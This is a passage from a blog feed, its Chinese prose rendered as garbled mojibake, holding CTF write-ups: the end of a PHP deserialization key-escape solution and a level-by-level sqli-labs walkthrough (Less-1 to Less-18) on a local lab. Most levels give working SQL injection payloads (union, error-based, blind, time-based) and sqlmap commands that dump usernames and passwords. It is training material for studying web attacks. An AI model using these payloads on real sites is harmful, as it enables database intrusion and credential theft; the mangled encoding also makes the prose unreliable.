class="language-none">"a:3{s:4:"user";s:24:"";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é”®é€ƒé€¸ï¼š</p><p>åªéœ€è¦ä¸€ä¸ªé”®å€¼å¯¹å°±è¡Œäº†ï¼Œæˆ‘ä»¬ç›´æ¥æ„é€ ä¼šè¢«è¿‡æ»¤çš„é”®ï¼Œè¿™æ ·å€¼å¾—ä¸€éƒ¨åˆ†å……å½“é”®ï¼Œå‰©ä¸‹å¾—ä¸€éƒ¨åˆ†ä½œä¸ºå•ç‹¬å¾—é”®å€¼å¯¹</p><pre class="line-numbers language-none"><code class="language-none">_SESSION[flagphp]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>var_dumpçš„ç»“æœä¸ºï¼š</p><pre class="line-numbers language-none"><code class="language-none">"a:2:{s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mbGxsbGxsYWc=";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³¨æ„åˆ°è¿™é‡Œçš„s:7:â€â€ä¹‹æ‰€ä»¥ä¸ºç©ºï¼Œæ˜¯å› ä¸ºæ„é€ çš„é”®flagphpéƒ½æ˜¯ä¼šè¢«è¿‡æ»¤çš„ï¼Œæ‰€ä»¥æ˜¾ç¤ºä¸ºç©ºï¼Œè¿™æ ·å°±èƒ½åƒæ‰ä¸€éƒ¨åˆ†å€¼äº†ï¼Œç„¶åå°†å‰©ä¸‹å¾—å€¼å……å½“å¦ä¸€ä¸ªå¯¹è±¡é€ƒé€¸å‡ºå»~~</p><p>ç„¶åçœ‹è¿™é¢˜</p><p>å¦‚æœ<code>f=show_image</code>ï¼Œä¼šæ‰§è¡Œååºåˆ—åŒ–</p><pre class="line-numbers language-none"><code class="language-none">$userinfo = unserialize($serialize_info);echo file_get_contents(base64_decode($userinfo['img']));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ‰§è¡Œ<code>d0g3_f1ag.php</code>ï¼Œå…ˆå¯¹<code>d0g3_f1ag.php</code>base64åŠ å¯†ï¼Œå¾—åˆ°<code>ZDBnM19mMWFnLnBocA==</code></p><p>æ„é€ payloadï¼Œå› ä¸ºä¼šè¿‡æ»¤<code>php</code>ï¼Œ<code>flag</code>ï¼Œ<code>php5</code>ï¼Œ<code>php4</code>ï¼Œ<code>fl1g</code></p><pre class="line-numbers language-none"><code class="language-none">$filter_arr = array('php','flag','php5','php4','fl1g');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰€ä»¥åªéœ€è¦ä¸€ä¸ªé”®å€¼å¯¹å°±è¡Œäº†ï¼Œæˆ‘ä»¬ç›´æ¥æ„é€ ä¼šè¢«è¿‡æ»¤çš„é”®ï¼Œè¿™æ ·å€¼å¾—ä¸€éƒ¨åˆ†å……å½“é”®ï¼Œå‰©ä¸‹å¾—ä¸€éƒ¨åˆ†ä½œä¸ºå•ç‹¬å¾—é”®å€¼å¯¹</p><pre class="line-numbers language-none"><code class="language-none">_SESSION[flagflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰€ä»¥è¿™æ ·å­æ„é€ </p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201854946.png" alt="image-20210208201854946"></p><p>æäº¤ä¹‹åå‘ç°ä¸€ç‰‡ç©ºç™½ï¼ŒæŸ¥çœ‹æºç å‘ç°æœ‰ä¸ªæç¤º</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201905995.png" alt="image-20210208201905995"></p><p>flagå°±åœ¨è¿™é‡Œé¢äº†</p><p>è¿˜æ˜¯åŒæ ·çš„æ–¹æ³•ï¼Œå¯¹<code>/d0g3_fllllllag</code>base64åŠ å¯†ï¼Œå¾—<code>L2QwZzNfZmxsbGxsbGFn</code>ï¼Œåªéœ€è¦æŠŠåŸæ¥çš„base64æ¢æˆè¿™ä¸ªå°±è¡Œäº†</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208203425686.png" alt="image-20210208203425686"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labsåšé¢˜è®°å½•</title>
      <link href="2020/ba-chang-xue-xi/sqli-labs-zuo-ti-ji-lu/"/>
      <url>2020/ba-chang-xue-xi/sqli-labs-zuo-ti-ji-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p><strong>æ‰‹åŠ¨</strong></p><p>å…ˆåˆ¤æ–­æ³¨å…¥ç±»å‹ã€‚</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-1/?id=1' and 1=1 --+http://127.0.0.1/sqli-labs/Less-1/?id=1' and 1=2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç¬¬ä¸€ç§ä¼ å…¥ç½‘ç«™æ˜¾ç¤ºæ­£å¸¸ï¼Œç¬¬äºŒç§ä¼ å…¥ç½‘ç«™æ˜¾ç¤ºä¸æ­£å¸¸ã€‚å¯ä»¥çœ‹å‡ºè¯­å¥å·²ç»è¢«æ‰§è¡Œã€‚å› æ­¤è¯´æ˜æ˜¯å•å¼•å·ç±»å‹æ³¨å…¥ã€‚ å…ˆåˆ¤æ–­å­—æ®µæ•°ã€‚ä¾æ¬¡é€’å¢order by åé¢çš„æ•°å€¼ã€‚</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 1 --+http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 2 --+http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 3 --+http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 4 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç°3æ—¶ä¸æŠ¥é”™,è€Œ4æ—¶æŠ¥é”™ï¼Œæ‰€ä»¥å­—æ®µæ•°æ˜¯3ã€‚<br>æ¥ä¸‹æ¥ç”¨è”åˆæŸ¥è¯¢åˆ¤æ–­æ˜¾ç¤ºä½ã€‚é¦–å…ˆè¦è®©idå˜æˆä¸€ä¸ªä¸å­˜åœ¨çš„å€¼ä»¥ä¾¿æ˜¾ç¤ºå‡ºæ¥çš„å€¼éƒ½æ˜¯unionè¯­å¥æ‰§è¡Œçš„ç»“æœã€‚æˆ‘ä½¿ç”¨çš„æ˜¯-1ã€‚</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194701808.png" alt="image-20210208194701808"></p><p>æ˜¾ç¤ºä½æ˜¯2,3ã€‚æ‰€ä»¥å¯ä»¥åœ¨ 2,3ä½ç½®è¿›è¡Œsqlæ³¨å…¥</p><p>è¿™é‡Œæ¶‰åŠåˆ°å‡ ä¸ªå‡½æ•°</p><p><a href="https://zhuanlan.zhihu.com/p/94594406">mysqlä¸­concat()ï¼Œconcat_ws()ï¼Œgroup_concat()çš„ç”¨æ³•</a></p><pre class="line-numbers language-none"><code class="language-none">çˆ†åº“:http://127.0.0.1/sqli-labs/Less-1/?id=100' union select 1,2,database() --+çˆ†è¡¨:http://127.0.0.1/sqli-labs/Less-1/?id=100' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+çˆ†å­—æ®µ:http://127.0.0.1/sqli-labs/Less-1/?id=100' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' --+çˆ†å€¼:http://127.0.0.1/sqli-labs/Less-1/?id=100' union select 1,2,group_concat(username,0x3a,password,0x3c2f62723e) from security.users --+ åŠ ä¸ªæ¢è¡Œç¬¦è¦å¥½çœ‹ç‚¹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194722570.png" alt="image-20210208194722570"></p><p><strong>sqlmap</strong></p><p>ä¸ºäº†æ–¹ä¾¿æˆªå›¾,åé¢åŠ ä¸ªè¾“å‡ºå‚æ•°ä¸º0</p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql â€“batch â€“v 0sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql --dbs --batch -v 0 #æŸ¥æœ‰å“ªäº›æ¨¡å¼sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security --tables  --batch -v 0 #æŸ¥è¡¨sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security -T users --columns  --batch -v 0 #æŸ¥å­—æ®µsqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0 #çœ‹ç”¨æˆ·åå’Œå¯†ç <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“æœ:</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194906554.png" alt="image-20210208194906554"></p><h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p> <strong>æ‰‹åŠ¨</strong></p><p>ç¬¬äºŒä¸ªå’Œç¬¬ä¸€ä¸ªå·®ä¸å¤š,ä½†æ˜¯æ˜¯æ•°å€¼å‹æ³¨å…¥,æŠŠ1åé¢çš„å¼•å·å»æ‰å°±è¡Œ</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=1 --+http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥å’Œless1ä¸€æ ·</p><p><strong>sqlmap</strong></p><p>å¥—less1çš„è¯­å¥å°±è¡Œ</p><h2 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h2><p> <strong>æ‰‹åŠ¨</strong></p><p>å…ˆä¼ id=1 å¥½å®¶ä¼™</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194806106.png" alt="image-20210208194806106"></p><p>è¦æ„é€ é—­åˆ,ä¸Šä¸€ç¯‡slqæ³¨å…¥çš„æ–‡ç« å†™è¿‡</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-3/?id=1') and 1=1 --+http://127.0.0.1/sqli-labs/Less-3/?id=1') and 1=2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥çš„å’Œä¸Šé¢ä¸€æ ·æ“ä½œ</p><p> <strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-3/?id=1') --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¬¬ä¸€ä¸ªè¿˜æ˜¯å¯ä»¥</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194824485.png" alt="image-20210208194824485"></p><h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><p><strong>æ‰‹åŠ¨</strong></p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195001271.png" alt="image-20210208195001271"></p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-4/?id=1"å’Œä¸Šé¢çš„ç±»ä¼¼,åªéœ€è¦é—­åˆ"")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥å’Œä¸Šé¢çš„æ“ä½œä¸€æ ·</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-4/?id=1 --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>å‰é¢å››é¢˜å…¶å®å·®ä¸å¤š,åªæ˜¯é—­åˆç¬¦å·çš„åŒºåˆ«</strong></p><h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><p>è¿™é¢˜æ²¡æœ‰æ˜¾ä½,æ‰€ä»¥åˆ¤æ–­æ˜¯å¸ƒå°”ç›²æ³¨,æ—¶é—´ç›²æ³¨,æˆ–è€…æ˜¯æŠ¥é”™æ³¨å…¥</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195017876.png" alt="image-20210208195017876"></p><p><strong>æ‰‹åŠ¨</strong></p><p>é€šè¿‡ä¸€ä¸ªleftå‡½æ•°æ¥åˆ¤æ–­,ä¸€ä¸ªä¸€ä¸ªå»è¯•å¤ªè´¹æ—¶é—´äº†,å¯ä»¥ç”¨burp suiteçˆ†ç ´</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-5/?id=1' and left((select database()),2)="se" --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200311822.png" alt="image-20210208200311822"></p><p>åé¢çš„å°±å’Œå‰é¢å·®ä¸å¤šäº†</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">çœ‹ä¸‹æœ‰å“ªäº›æ•°æ®åº“python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql --dbs --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195053128.png" alt="image-20210208195053128"></p><pre class="line-numbers language-none"><code class="language-none">æŸ¥çœ‹securityæ•°æ®åº“çš„è¡¨python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql -D security --tables --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195747622.png" alt="image-20210208195747622"></p><pre class="line-numbers language-none"><code class="language-none">æŸ¥çœ‹å­—æ®µpython sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql -D security -T users --columns --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195649270.png" alt="image-20210208195649270"></p><pre class="line-numbers language-none"><code class="language-none">æŸ¥çœ‹ç”¨æˆ·åå’Œå¯†ç  python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195813166.png" alt="image-20210208195813166"></p><h2 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h2><p>è¿™é¢˜å’Œä¸Šé¢less5å·®ä¸å¤šï¼Œå°±æ˜¯é—­åˆç¬¦å·ä¸ä¸€æ ·ï¼ŒæŠŠå•å¼•å·æ”¹æˆåŒå¼•å·å°±å¯ä»¥äº†</p><h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><p><strong>æ‰‹åŠ¨</strong></p><p>å…ˆç¡®å®šæ˜¯å¦‚ä½•é—­åˆçš„ï¼Œå¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-7?id=1')) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195934527.png" alt="image-20210208195934527"></p><p>æ ¹æ®æç¤ºï¼Œç›®æµ‹æ˜¯å¯¹æ•°æ®åº“æ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬è¯•è¯•(å› ä¸ºæˆ‘æ˜¯è£…åœ¨è‡ªå·±çš„ç”µè„‘ä¸Šçš„æ‰€ä»¥çŸ¥é“ç»å¯¹è·¯å¾„)</p><p><strong>sqlmap</strong></p><p>å¸ƒå°”ç›²æ³¨ç›´æ¥è·‘</p><pre class="line-numbers language-none"><code class="language-none">â¯ python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-7/?id=1 --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h2><p><strong>æ‰‹åŠ¨</strong></p><p>è¿™é¢˜ä¹Ÿæ˜¯å¸ƒå°”ç›²æ³¨ï¼Œpayloadå’Œç¬¬äº”é¢˜å·®ä¸å¤šï¼Œå¯ä»¥ç”¨leftå‡½æ•°æˆ–ASCIIå‡½æ•°æ¥ä¸€ä¸ªä¸€ä¸ªæ¥åˆ¤æ–­ï¼Œè¿˜æ˜¯ç”¨sqlmapèˆ’æœğŸ¤£</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">â¯ python sqlmap.py -u 'http://127.0.0.1/sqli-labs/Less-8/?id=1' --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h2><p>æ—¶é—´æ³¨å…¥</p><p><strong>æ‰‹åŠ¨</strong></p><p>åˆæ˜¯ä¸€ä¸ªä¸€ä¸ªå»è¯•ï¼Œå¯ä»¥é‡‡ç”¨ASCIIå‡½æ•°é‡‡ç”¨äºŒåˆ†æ³•æ¥æ‰¾åˆ°æ­£ç¡®çš„å­—ç¬¦ï¼Œç„¶åé…åˆsleep(5)å‡½æ•°æ¥æ„é€ </p><p><strong>sqlmap</strong></p><p>æŠŠtechniqueæ”¹æˆTæ¥è¯•è¯•</p><pre class="line-numbers language-none"><code class="language-none">â¯ python sqlmap.py -u 'http://127.0.0.1/sqli-labs/Less-9/?id=1' --technique T --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h2><p><strong>æ‰‹åŠ¨</strong></p><p>è¿˜æ˜¯æ—¶é—´æ³¨å…¥,åªæ˜¯å’Œä¸Šä¸€é¢˜çš„æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·</p><p>å…ˆæ„é€ é—­åˆï¼Œè¯•äº†ä¸€ä¸‹ä¸‹é¢å‡ ä¸ªï¼Œé©¬ä¸Šå°±æ˜¾ç¤ºyou are inäº†ï¼Œè¯´æ˜æ²¡æœ‰è¢«æ‰§è¡Œ</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-10/?id=1' and sleep(5)--+http://127.0.0.1/sqli-labs/Less-10/?id=1') and sleep(5)--+http://127.0.0.1/sqli-labs/Less-10/?id=1')) and sleep(5)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æœ€ç»ˆæ­£ç¡®çš„é—­åˆæ˜¯</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-10/?id=1" and sleep(5)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åå°±å’Œä¸Šé¢˜less9ä¸€æ ·æ“ä½œäº†</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">â¯ python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-10/?id=1 --technique T --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h2><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195951851.png" alt="image-20210208195951851"></p><p>ä»è¿™ä»¥åå°±å…¨éƒ¨å˜æˆpostæ³¨å…¥äº†</p><p><strong>æ‰‹åŠ¨</strong></p><pre class="line-numbers language-none"><code class="language-none">usernameéƒ¨åˆ†username=admin' union select 1,database()# æŠŠusernameæ¢æˆadmin,åé¢çš„æ“ä½œå°±å’Œç¬¬ä¸€é¢˜å·®ä¸å¤šäº†username=1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#username=1' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'#username=1' union select 1,group_concat(username,0x3a,password,0x3c2f62723e) from security.users#passwordå¯ä»¥éšä¾¿è¾“,å› ä¸ºåå°å·²ç»æ³¨é‡Šæ‰äº†SELECT username, password FROM users WHERE username='1' union select 1,group_concat(username,0x3a,password,0x3c2f62723e) from security.users#' and password='$passwd' LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200012353.png" alt="image-20210208200012353"></p><p><strong>sqlmap</strong></p><p>å…ˆbuspsuiteæŠ“åŒ…ï¼Œçœ‹çœ‹dataæ•°æ®çš„æ ¼å¼ï¼Œç„¶åå†æ‹¿sqlmapè·‘å°±å¯ä»¥äº†</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200030999.png" alt="image-20210208200030999"></p><pre class="line-numbers language-none"><code class="language-none">â¯ python sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-11/ --data "uname=admin &amp;passwd=admin &amp;submit=Submit" --dbms mysql -D security -T users --threads 5 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h2><p>ä¸æ–­å°è¯•å‡ æ¬¡æ—¶å€™å‘ç°ï¼Œè¿™é¢˜å’Œless11ä¸€æ¨¡ä¸€æ ·ï¼Œåªæ˜¯é—­åˆæ–¹å¼å˜äº†ï¼Œå˜æˆäº†â€ï¼‰</p><h2 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h2><p><strong>æ‰‹åŠ¨</strong></p><p>å‘ç°ç”¨â€˜)é—­åˆä¹‹åæ²¡æœ‰æ˜¾ç¤ºä½ï¼Œé‚£å°±è¯•è¯•æŠ¥é”™æ³¨å…¥</p><p>å°è¯•ä½¿ç”¨extractvalue()å‡½æ•°</p><p>ç›´æ¥extractvalue(1ï¼Œdatabase())å¥½åƒæœ‰ç‚¹é—®é¢˜ï¼ŒæŸ¥ç•¥ä¸€ç•ªèµ„æ–™åå‘ç°åŠ ä¸ªconcatå°±æ­£å¸¸äº†</p><pre class="line-numbers language-none"><code class="language-none">username=1') and extractvalue(1,concat(1,database()))#username=1') and extractvalue(1,concat(1,(select (table_name) from information_schema.tables where table_schema=database() limit 0,1)))#username=1') and extractvalue(1,concat(1,(select (column_name) from information_schema.columns where table_name='users' limit 0,1)))#username=1') and extractvalue(1,concat(1,(select concat(username,0x3a,password) from security.users limit 1,1)))#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200352121.png" alt="image-20210208200352121"></p><p><strong>sqlmap</strong></p><p>å› ä¸ºä¹‹å‰å·²ç»æŠ“è¿‡åŒ…,postè¯·æ±‚åº”è¯¥æ˜¯ä¸€æ ·çš„,æ‰€ä»¥å’Œå‘½ä»¤å’Œç¬¬åä¸€é¢˜æ˜¯ä¸€æ ·</p><h2 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h2><p>å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œåªæ˜¯é—­åˆå˜æˆäº†â€œ</p><h2 id="less15"><a href="#less15" class="headerlink" title="less15"></a>less15</h2><p><strong>æ‰‹åŠ¨</strong></p><p>è¿™é¢˜ä¸èƒ½ç”¨æŠ¥é”™æ³¨å…¥ï¼Œè¯•è¯•å…¶ä»–çš„å§</p><p>å…ˆè¯•è¯•æ•°æ®åº“çš„é•¿åº¦</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200413051.png" alt="image-20210208200413051"></p><p>ä¾æ—§ä½¿ç”¨leftå‡½æ•°æ¥åˆ¤æ–­</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200429516.png" alt="image-20210208200429516"></p><p>ç„¶åå°±æ˜¯ä¸€ä¸ªä¸€ä¸ªå»è¯•å•¦ï¼Œä¹Ÿå¯ä»¥å€ŸåŠ©ä¸€äº›è„šæœ¬ï¼Œæˆ–è€…æ˜¯burpsuite</p><p><strong>sqlmap</strong></p><p>ç„¶å®ƒè‡ªå·±å»æµ‹å§ï¼Œä»ç»“æœæ¥çœ‹ï¼Œå¯ä»¥æŒ‡å®šä½¿ç”¨å¸ƒå°”ç›²æ³¨æˆ–è€…æ˜¯æ—¶é—´ç›²æ³¨ï¼Œè¿™æ ·å­è·‘çš„ä¼šå¿«ä¸€äº›</p><pre class="line-numbers language-none"><code class="language-none">â¯ python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data "uname=admin &amp;passwd=admin &amp;submit=Submit" --dbms mysql -D security -T users --threads 5 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less16"><a href="#less16" class="headerlink" title="less16"></a>less16</h2><p>å’Œ15é¢˜ä¸€æ ·ï¼Œåªæ˜¯é—­åˆå˜æˆäº†â€ï¼‰</p><p>sqlmapçš„è¯ç”¨ä¸Šé¢çš„è·‘ä¸å‡ºäº†ï¼Œåœ¨ç½‘ä¸ŠæŸ¥åˆ°sqlmapé»˜è®¤çš„è¾“å‡ºç­‰çº§æ˜¯1ï¼Œè¿™é‡ŒæŠŠè¾“å‡ºç­‰çº§è°ƒé«˜ä¸€ç‚¹å°±å¥½äº†</p><h2 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h2><p><strong>æ‰‹åŠ¨</strong></p><p>è¿™ä¸€å…³å¼€å§‹çœ‹ç€æœ‰ç‚¹æ‡µï¼Œæç¤ºè¦é‡ç½®å¯†ç </p><p>æŸ¥çœ‹postå†…å®¹ï¼Œå‘ç°æ˜¯åœ¨passwdå¤„</p><p>æˆ‘çš„ç†è§£æ˜¯æ¥æ”¶åˆ°ç”¨æˆ·POSTæäº¤çš„unameå’Œpasswdåï¼Œæ ¹æ®unameæŸ¥è¯¢æ•°æ®åº“çš„usernameå’Œpasswordï¼Œè‹¥unameå­˜åœ¨åˆ™ç”¨passwdæ›¿æ¢passwordï¼Œè‹¥ä¸å­˜åœ¨åˆ™æ˜¾ç¤ºslap1.jpg</p><p>æ‰€ä»¥æ³¨å…¥çš„æ—¶å€™è¦åœ¨è¿™é‡Œï¼Œç”¨æˆ·åçš„è¯å°±ç”¨adminå§</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200502414.png" alt="image-20210208200502414"></p><p>éœ€è¦ç”¨åˆ°çš„æ˜¯updatexmlå‡½æ•°</p><pre class="line-numbers language-none"><code class="language-none">uname=admin&amp;passwd=123123' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1)),1)#&amp;sumit=Submitæ¥ä¸‹æ¥çš„å’Œå‰é¢å·®ä¸å¤š<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">â¯ python sqlmap.py -r æŠ“åŒ…ä¿å­˜çš„æ–‡ä»¶è·¯å¾„ --tech E --dbms mysql -D security -T users --threads 5 --level=4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h2><p><strong>æ‰‹åŠ¨</strong></p><p>ç™»å½•å¤±è´¥åªä¼šæ˜¾ç¤ºipåœ°å€,ç™»å½•æˆåŠŸä¼šæ˜¾ç¤ºuser agent</p><p>éšåå‘ç°usernameå’Œpasswordéƒ½è¢«è½¬ä¹‰äº†,æ„é€ ä¸äº†é—­åˆæ¡ä»¶</p><p>çŒœæµ‹å¯èƒ½å¯ä»¥é€šè¿‡user agentæ¥æ³¨å…¥,çœ‹äº†ä¸‹æºç ,ç¡®å®å¦‚æ­¤</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200520106.png" 